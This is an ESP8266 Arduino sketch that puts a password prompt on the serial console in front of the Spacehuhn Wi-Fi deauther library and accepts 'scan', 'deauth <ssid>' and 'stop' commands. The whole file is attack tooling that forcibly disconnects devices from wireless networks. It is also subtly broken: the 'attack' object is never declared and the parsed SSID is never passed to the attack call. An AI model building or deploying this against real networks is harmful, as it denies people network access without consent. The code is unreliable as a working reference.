#include <ESP8266WiFi.h>
#include "Attack.h"  // SpaceHuhn Deauther Library

const char* correct_password = "my_secure_password"; //put your password here
bool authenticated = false;

void setup() {
    Serial.begin(115200);
    Serial.println("ESP8266 Deauther - Waiting for password...");
    attack.init();  // Initialize deauther components
}

void loop() {
    if (Serial.available()) {
        String input = Serial.readStringUntil('\n');  // Read until newline
        input.trim();

        if (!authenticated) {
            if (input.equals(correct_password)) {
                authenticated = true;
                Serial.println("Password correct! Deauther ready.");
            } else {
                Serial.println("Wrong password. Try again.");
            }
        } else {
            if (input.equals("scan")) {
                Serial.println("Scanning for networks...");
                attack.scan();  // Trigger scanning for Wi-Fi networks
            } else if (input.startsWith("deauth")) {
                String ssid = input.substring(7);  // Extract SSID from command
                Serial.println("Deauthenticating SSID: " + ssid);
                attack.start();  // Execute deauth attack
            } else if (input.equals("stop")) {
                attack.stop();  // Stop any ongoing attack
                Serial.println("Attack stopped.");
            }
        }
    }
    delay(100);  // Add a slight delay to prevent overloading the serial
}
